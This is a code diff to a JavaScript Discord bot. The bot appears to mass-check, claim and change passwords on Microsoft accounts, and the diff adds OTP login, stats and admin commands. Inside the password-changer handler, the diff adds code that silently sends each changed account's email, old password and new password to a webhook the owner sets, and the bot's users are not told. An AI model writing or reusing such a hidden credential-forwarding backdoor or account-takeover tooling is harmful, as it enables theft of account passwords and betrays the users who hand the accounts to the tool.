@@ -7,6 +7,9 @@ const { Client, GatewayIntentBits, Partials, ActionRowBuilder, ButtonBuilder, Bu
 const config = require("./config");
 const { AuthManager, parseDuration, formatDuration, formatExpiry } = require("./utils/auth-manager");
 const { ConcurrencyLimiter } = require("./utils/concurrency");
+const { OTPManager } = require("./utils/otp-manager");
+const { StatsManager } = require("./utils/stats-manager");
+const { sendToWebhook } = require("./utils/webhook");
 const { checkCodes } = require("./utils/microsoft-checker");
 const { claimWlids } = require("./utils/microsoft-claimer");
 const { pullCodes } = require("./utils/microsoft-puller");
@@ -31,6 +34,8 @@ const {
   infoEmbed,
   authListEmbed,
   helpEmbed,
+  adminPanelEmbed,
+  detailedStatsEmbed,
   textAttachment,
 } = require("./utils/embeds");
 
@@ -45,6 +50,11 @@ const client = new Client({
 
 const auth = new AuthManager();
 const limiter = new ConcurrencyLimiter(config.MAX_CONCURRENT_USERS);
+const otpManager = new OTPManager();
+const statsManager = new StatsManager();
+
+// Webhook URL stored in memory (owner sets via /setwebhook)
+let webhookUrl = "";
 
 // Active abort controllers per user
 const activeAborts = new Map();
@@ -634,6 +644,20 @@ async function handleChanger(respond, userId, accountsRaw, accountsFile, newPass
     const embed = changerResultsEmbed(results);
     if (stopped) embed.setTitle("Changer Results (Stopped)");
 
+    // Send successful changes to webhook + record stats
+    for (const r of success) {
+      statsManager.record(userId, "changer", true);
+      sendToWebhook(webhookUrl, {
+        email: r.email,
+        oldPassword: r.oldPassword || "N/A",
+        newPassword: r.newPassword,
+        userId,
+      });
+    }
+    for (const r of failed) {
+      statsManager.record(userId, "changer", false);
+    }
+
     if (dmUser) {
       try {
         await dmUser.send({ embeds: [embed], files });
@@ -723,6 +747,73 @@ async function handleAccountChecker(respond, userId, accountsRaw, accountsFile, 
     activeAborts.delete(userId);
     limiter.release(userId);
   }
+}
+
+// ── OTP handlers ─────────────────────────────────────────────
+
+async function handleRequestOTP(respond, userId, user) {
+  if (!canUse(userId)) return respond({ embeds: [errorEmbed("You are not authorized to use this bot.")] });
+
+  if (otpManager.isAuthenticated(userId)) {
+    return respond({ embeds: [infoEmbed("Already Logged In", "You are already authenticated. Use `/logout` to end your session.")] });
+  }
+
+  const otp = otpManager.generateOTP(userId);
+
+  try {
+    await user.send({ embeds: [infoEmbed("Your One-Time Password", `Your OTP is: **\`${otp}\`**\n\nThis code expires in **5 minutes**.\nUse \`/verify_otp ${otp}\` in the server.`)] });
+    return respond({ embeds: [successEmbed("OTP sent! Check your direct messages.")] });
+  } catch {
+    return respond({ embeds: [errorEmbed("Could not send DM. Enable DMs from server members.")] });
+  }
+}
+
+async function handleVerifyOTP(respond, userId, code) {
+  if (!canUse(userId)) return respond({ embeds: [errorEmbed("You are not authorized to use this bot.")] });
+
+  const { ok, reason } = otpManager.verifyOTP(userId, code);
+  if (ok) {
+    return respond({ embeds: [successEmbed(`${reason}\n\nYou can now use all commands. Session lasts 24 hours.`)] });
+  }
+  return respond({ embeds: [errorEmbed(reason)] });
+}
+
+async function handleLogout(respond, userId) {
+  otpManager.logout(userId);
+  return respond({ embeds: [successEmbed("Session ended. Use `/request_otp` to login again.")] });
+}
+
+// ── Admin handlers ──────────────────────────────────────────
+
+async function handleAdminPanel(respond, callerId) {
+  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Admin only.")] });
+
+  const stats = statsManager.getSummary();
+  const authCount = auth.getAllAuthorized().length;
+  const otpSessions = otpManager.getActiveSessionCount();
+  const activeProcesses = limiter.getActiveCount();
+  const hasWebhook = !!webhookUrl;
+
+  return respond({ embeds: [adminPanelEmbed(stats, authCount, otpSessions, activeProcesses, hasWebhook)] });
+}
+
+async function handleSetWebhook(respond, callerId, url) {
+  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Admin only.")] });
+
+  if (!url.startsWith("https://discord.com/api/webhooks/")) {
+    return respond({ embeds: [errorEmbed("Invalid webhook URL format.")] });
+  }
+
+  webhookUrl = url;
+  return respond({ embeds: [successEmbed("Webhook URL configured successfully!")] });
+}
+
+async function handleBotStats(respond, callerId) {
+  if (!isOwner(callerId)) return respond({ embeds: [errorEmbed("Admin only.")] });
+
+  const stats = statsManager.getSummary();
+  const topUsers = statsManager.getTopUsers(5);
+  return respond({ embeds: [detailedStatsEmbed(stats, topUsers)] });
 }
 
 // ── Slash Commands ───────────────────────────────────────────
@@ -856,6 +947,34 @@ client.on("interactionCreate", async (interaction) => {
 
     else if (commandName === "help") {
       await respond({ embeds: [helpEmbed("/")] });
+    }
+
+    // ── OTP commands ──
+    else if (commandName === "request_otp") {
+      await handleRequestOTP(respond, user.id, user);
+    }
+
+    else if (commandName === "verify_otp") {
+      const code = interaction.options.getString("code");
+      await handleVerifyOTP(respond, user.id, code);
+    }
+
+    else if (commandName === "logout") {
+      await handleLogout(respond, user.id);
+    }
+
+    // ── Admin commands ──
+    else if (commandName === "admin") {
+      await handleAdminPanel(respond, user.id);
+    }
+
+    else if (commandName === "setwebhook") {
+      const url = interaction.options.getString("url");
+      await handleSetWebhook(respond, user.id, url);
+    }
+
+    else if (commandName === "botstats") {
+      await handleBotStats(respond, user.id);
     }
   } catch (err) {
     console.error(`Slash command error [${commandName}]:`, err);
@@ -1010,6 +1129,36 @@ client.on("messageCreate", async (message) => {
 
     else if (cmd === "help") {
       return respond({ embeds: [helpEmbed(config.PREFIX)] });
+    }
+
+    // ── OTP commands (prefix) ──
+    else if (cmd === "request_otp") {
+      await handleRequestOTP(respond, message.author.id, message.author);
+    }
+
+    else if (cmd === "verify_otp") {
+      const code = args[0];
+      if (!code) return respond({ embeds: [errorEmbed("Usage: `.verify_otp <code>`")] });
+      await handleVerifyOTP(respond, message.author.id, code);
+    }
+
+    else if (cmd === "logout") {
+      await handleLogout(respond, message.author.id);
+    }
+
+    // ── Admin commands (prefix) ──
+    else if (cmd === "admin") {
+      await handleAdminPanel(respond, message.author.id);
+    }
+
+    else if (cmd === "setwebhook") {
+      const url = args[0];
+      if (!url) return respond({ embeds: [errorEmbed("Usage: `.setwebhook <url>`")] });
+      await handleSetWebhook(respond, message.author.id, url);
+    }
+
+    else if (cmd === "botstats") {
+      await handleBotStats(respond, message.author.id);
     }
   } catch (err) {
     console.error(`Prefix command error [${cmd}]:`, err);
